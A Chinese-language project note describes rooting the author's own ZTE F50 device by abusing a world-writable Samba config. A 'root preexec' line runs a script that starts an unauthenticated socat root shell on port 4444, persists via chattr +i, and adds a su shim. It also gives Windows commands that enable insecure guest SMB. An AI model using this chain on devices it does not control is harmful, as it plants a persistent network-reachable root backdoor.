# 04 Root 通道（Samba root preexec + su 兼容层）

本机没有可用的 Magisk `su`，Android 侧最初只有 10 秒开机 ADB 窗口（shell 用户）。
没有 root 就无法执行 mu300 安装器（它要求 `adb shell su -c`）。
最终找到并利用了 ZTE 自带 Samba 服务的一个特性，取得稳定的 root 执行能力。

## 发现过程

1. 通过开机 ADB 窗口在 `/data/samba/etc` 下发现：
   ```
   drwxrwxrwx 2 root  root   /data/samba
   -rwxrwxrwx 1 shell shell  smb.conf        (world-writable，属主 shell)
   -rw------- 1 root  root   smbpasswd
   ps: root ... smbd   (Samba 服务以 root 身份运行，监听 0.0.0.0:139/445)
   ```
2. `smb.conf` 可写，且 `smbd` 以 root 运行，Samba 支持 `root preexec`（连接共享时以 root 执行）。
   于是只要把一行 `root preexec` 写进 `[F50]` 共享段，之后任何 SMB 客户端连接都会以 root 执行它。
3. 另一个必要条件：`/data/local/tmp` 可由 root 写入脚本/socat，root preexec 指向它即可。

## 实际落地（本机状态）

`/data/samba/etc/smb.conf` 末尾追加：

```ini
    root preexec = /system/bin/sh /data/local/tmp/root.sh
```

并用 `chattr +i` 锁定该文件，防止 ZTE 的 USB 服务在切换 USB 模式时重写它：

```
----i----E---------- /data/samba/etc/smb.conf
```

`/data/local/tmp/root.sh`（由 [`scripts/device/setup-device-root.sh`](../scripts/device/setup-device-root.sh) 生成）：

```sh
#!/system/bin/sh
LOG=/data/local/tmp/root.log
chmod 755 /data/local/tmp/socat 2>/dev/null
if ! pidof socat >/dev/null 2>&1; then
  nohup /data/local/tmp/socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/system/bin/sh >> $LOG 2>&1 &
fi
if [ -x /data/local/tmp/rootbin/su ]; then mount --bind /data/local/tmp/rootbin /odm/bin 2>>$LOG; fi
setprop service.adb.tcp.port 5555 2>>$LOG
setprop persist.service.adb.tcp.port 5555 2>>$LOG
```

效果：SMB 连接后，`192.168.0.1:4444` 上出现一个 **root shell**（`context=u:r:su:s0`，SELinux 为 Permissive）。

## 触发方式（Windows）

Windows 默认禁止匿名/来宾 SMB（错误 1272）。开启一次即可（管理员）：

```bat
reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth /t REG_DWORD /d 1 /f
net use \\192.168.0.1\F50 /user:guest ""
```

随后 `node scripts/f50-root-shell.mjs trigger` / `exec "id"` 即可。

## su 兼容层（关键）

mu300 安装器的部分脚本（`extract_subset.py`、`pull_closure.py`）在主机上直接调用
`adb shell "su -c '...'"`，而不是走安装器的 `SuDo`。设备上没有 `su` 就会失败：

```
/system/bin/sh: su: inaccessible or not found
```

解决办法：在 adb shell 的 `$PATH` 中放一个 `su`：

- adb shell 的 PATH：`/product/bin:/apex/com.android.runtime/bin:/apex/com.android.art/bin:/system_ext/bin:/system/bin:/system/xbin:/odm/bin:/vendor/bin:/vendor/xbin`
- `/odm/bin` 在 PATH 里且内容为空（仅 `fm_tools`），于是把 `/data/local/tmp/rootbin` bind-mount 到 `/odm/bin`。
- `/data/local/tmp/rootbin/su` 是一个脚本：把命令转发到 `127.0.0.1:4444` 的 root shell（用 socat 客户端）。
- 同时把原来的 `fm_tools` 复制进 rootbin，避免隐藏它。

验证（shell 用户执行）：

```
$ adb shell su -c 'id'
uid=0(root) gid=0(root) groups=0(root) context=u:r:su:s0
```

## 需要的设备端文件

| 路径 | 来源 |
|---|---|
| `/data/local/tmp/socat` | UFI-TOOLS APK 内 `assets/shell/socat`（arm64 Android 静态二进制），可用 `adb push` 或 SMB 传入 |
| `/data/local/tmp/root.sh`、`/data/local/tmp/rootbin/su` | 由 `scripts/device/setup-device-root.sh` 生成 |

## 持久性与恢复

- Android 每次重启后：Samba 服务自启 → 任意一次 SMB 连接（`net use`）即恢复 root shell；
  `root.sh` 会同时恢复 su 绑定和 adb TCP 5555。
- `smb.conf` 已 `chattr +i`，ZTE 服务无法覆盖；如需修改，先 `chattr -i`。
- 本通道仅在 Android 运行时存在；同一台设备的 OpenWrt 侧不依赖它。

## 安全说明

- `root preexec` 指向的脚本是**固定路径**（`/data/local/tmp/root.sh`），SMB 客户端不能借它执行任意命令。
- 但 `socat` 根 shell 监听在 0.0.0.0:4444，Android 热点/局域网内的客户端在 Android 运行时可连上。
  建议：切换到 Android 时关闭热点，或把 `TCP-LISTEN` 改为 `bind=192.168.0.1` 并配合防火墙；
  更彻底的做法是改成 `bind=127.0.0.1` + 主机 `adb forward tcp:4444 tcp:4444`（本项目未改，留作硬化项）。
